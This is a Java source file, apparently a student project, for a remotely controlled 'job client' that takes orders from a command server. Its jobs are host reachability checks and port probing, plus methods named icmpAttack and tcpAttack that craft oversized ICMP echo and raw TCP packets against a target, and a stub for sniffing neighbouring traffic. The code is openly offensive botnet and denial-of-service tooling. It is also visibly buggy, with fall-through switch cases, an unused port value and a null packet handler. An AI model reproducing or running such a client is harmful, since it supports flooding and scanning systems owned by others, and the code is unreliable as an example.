// Java program for a Client


import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;

import java.io.*;
import java.net.*;


public class Jobclient{

    static Socket sock = null;

    public static void main(String[] args) {

        PrintWriter toServer = null;
        String hostname = "127.0.0.1"; 
        int port = 8080;

        try {
            sock = new Socket(hostname, port);
            System.out.println("Connected to server!");
           
            OutputStream out = sock.getOutputStream();
            toServer = new PrintWriter(out, true);

            
            InputStream input = sock.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(input));

            while(true) {

                // JOB ASSIGNMENTS
                System.out.println("Waiting for Job Assignment....");

                String job = reader.readLine();
                System.out.println("Job received: " + job);
                String[] tokens = job.split(",");
                String target;

                // Pick job 
                switch (Integer.parseInt(tokens[0])) {
                    
                    case 0:
                        SpyOnNeighbors();
                    
                    case 1:
                        boolean isOnline = true;
                        
                        if (Integer.parseInt(tokens[1]) == 1)
                            isOnline = InetAddress.getByAddress(convertIP(tokens[2])).isReachable(5000); 
                        else
                            isOnline = InetAddress.getByName(tokens[2]).isReachable(5000); 

                        if (isOnline)
                            toServer.println(tokens[2] + " is online!");
                        else
                            toServer.println(tokens[2] + " is not online!");
                        break;
                    // JOB: Detect the status of a given port at a given IP address
                    case 2:
                        toServer.println(job2(tokens[1], Integer.parseInt(tokens[2])));
                        break;
                    
                    case 3:
                        toServer.flush();
                        sock.close();
                        reader.close();
                        return;

                    case 4:
                        target = reader.readLine();
                        icmpAttack(target);

                    case 5:
                        target = reader.readLine();
                        int portNumber = reader.read();
                        tcpAttack(target, port);
                }
                toServer.flush();
            }
        }
        catch(Exception e) {
            if (toServer != null)
                toServer.println("error"); 
        }
    }

    public static void icmpAttack(String target) {
        
        PcapNetworkInterface devices;
        PcapStat stat;
        PcapHandle handler;
        byte[] data = new byte[70000];
        
        for(int idx=0; idx< data.length; idx++){
            data[idx] = (byte) idx;
        }

        try{
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();
            NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
            NetworkInterface niLocal = NetworkInterface.getByInetAddress(localhost);

            byte[] mac = niLocal.getHardwareAddress();
            System.out.println("Garbage value: " + mac.toString());
            MacAddress sourceMac = MacAddress.getByAddress(niLocal.getHardwareAddress());
            
            if(sourceMac != null)
                System.out.println("Source Mac Address is(in String format): "+sourceMac.toString());
            else
                System.out.println("Source Mac Address is NULL!");

            devices = Pcaps.getDevByAddress(localhost);
            
            System.out.println(devices);
            System.out.println("Local: " + niLocal.getDisplayName());
            System.out.println("Before Handler: ");
            
            handler = devices.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
            stat = handler.getStats();
            
            System.out.println("Before Handler SendPacket");
            System.out.println("\nReceiving Packets\n");
            
            PacketListener packetListener = new PacketListener() {
                
                @Override
                public void gotPacket(PcapPacket pcapPacket) {
                    System.out.println("Received packets are: \n");
                    System.out.println(pcapPacket.getTimestamp());
                    System.out.println(pcapPacket);
                }
            };

            IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
            echoPacket.identifier((short) 1);
            echoPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));

            IcmpV4CommonPacket.Builder echoIcmp = new IcmpV4CommonPacket.Builder();
            echoIcmp.type(IcmpV4Type.ECHO);
            echoIcmp.code(IcmpV4Code.NO_CODE);
            echoIcmp.payloadBuilder(echoPacket);
            echoIcmp.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
            ipV4Builder.version(IpVersion.IPV4);
            ipV4Builder.tos(IpV4Rfc791Tos.newInstance((byte) 0));
            ipV4Builder.ttl((byte) 100);
            ipV4Builder.protocol(IpNumber.ICMPV4);
            ipV4Builder.srcAddr((Inet4Address) InetAddress.getLocalHost());
            ipV4Builder.dstAddr((Inet4Address) InetAddress.getByName(target));
            ipV4Builder.payloadBuilder(echoIcmp);
            ipV4Builder.correctChecksumAtBuild(true);
            
            for (Packet.Builder builder : ipV4Builder.correctLengthAtBuild(true)) {
                System.out.println("###########");
                System.out.println("Sending Echo request Packets..");
                System.out.println("###########");
                //comment line below to execute on Windows
                //handler.sendPacket(data);
            }

            EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
            ethernet.dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS);
            ethernet.srcAddr(sourceMac);
            ethernet.type(EtherType.IPV4);
            ethernet.paddingAtBuild(true);

            Packet pack = ethernet.build();
            System.out.println("###########");
            System.out.println("Sending Echo request Packets");
            System.out.println("###########");

            handler.sendPacket(pack);
            handler.loop(40, packetListener);

            System.out.println(stat.getNumPacketsCaptured());
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }
  
    public static byte[] convertIP(String IPString) {
        String replace = IPString.replace('.', ',');
        String[] newIPString = replace.split(",");
        byte[] ipAddress = new byte[newIPString.length];
        
        for(int idx = 0; idx < newIPString.length; idx++) {
            ipAddress[idx] = (byte) Integer.parseInt(newIPString[idx]);
        }

        return ipAddress;
    }
    
    public static String job2(String hostName, int portNum) {
        String output = "Closed";
        try {
            (new DatagramSocket(portNum, InetAddress.getByName(hostName))).close();
            output = "UDP Open";
            (new Socket(hostName, portNum)).close();
            return "TCP and UDP Open";
        } catch(IOException ignored) { }

        try {
            (new Socket(hostName, portNum)).close();
            output = "TCP Open";
        } 
        catch(IOException ignored) 
        { }

        return output;
    }

    public static String macAddress(byte[] targetIP) {
        String mac;

        System.out.println("Mac Address: "+targetIP);
        mac = new String(targetIP);
        System.out.println("Mac Address: "+mac);
        return mac;
    }

    public static void tcpAttack(String target, int port){
        
        PcapHandle handler = null;
        System.out.println("Connection port: "+sock.getLocalPort());
        int localPort = sock.getLocalPort();
        byte[] data = new byte[900];
        
        for(int idx=0; idx < data.length; idx++){
            data[idx] = (byte) idx;
        }

        try {
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();

            TcpPacket.Builder tcpPacket = new TcpPacket.Builder();
            tcpPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));
            tcpPacket.srcAddr(localhost);
            tcpPacket.dstAddr(targetAddress);
            tcpPacket.srcPort(TcpPort.getInstance((short)localPort));
            tcpPacket.dstPort(TcpPort.getInstance((short) port));
            tcpPacket.correctLengthAtBuild(true);
            tcpPacket.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4PacketBuilder = new IpV4Packet.Builder();
            ipV4PacketBuilder.payloadBuilder(tcpPacket);
            ipV4PacketBuilder.version(IpVersion.IPV4);
            ipV4PacketBuilder.tos((IpV4Packet.IpV4Tos) () -> (byte) 0);
            ipV4PacketBuilder.protocol(IpNumber.TCP);
            ipV4PacketBuilder.srcAddr((Inet4Address) localhost);
            ipV4PacketBuilder.dstAddr((Inet4Address) targetAddress);
            ipV4PacketBuilder.correctLengthAtBuild(true);
            ipV4PacketBuilder.correctChecksumAtBuild(true);

            IpV4Packet ipV4Packet = ipV4PacketBuilder.build();
            data = ipV4Packet.getRawData();
            System.out.println("New packet: "+IpV4Packet.newPacket(data,0,data.length));
            
            handler.sendPacket(data);
        } 
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void SpyOnNeighbors(){
        
        PcapHandle handle = null;
        PcapNetworkInterface networkInterface = null;
        PcapStat packetStat;
        PcapDumper dump = null;

        System.out.println("----- Spying on the neighbors ----");

        try {
            System.out.println("All the neighbors are: ");
            networkInterface = new NifSelector().selectNetworkInterface();
            System.out.println("You chose: " + networkInterface);
        } 
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}

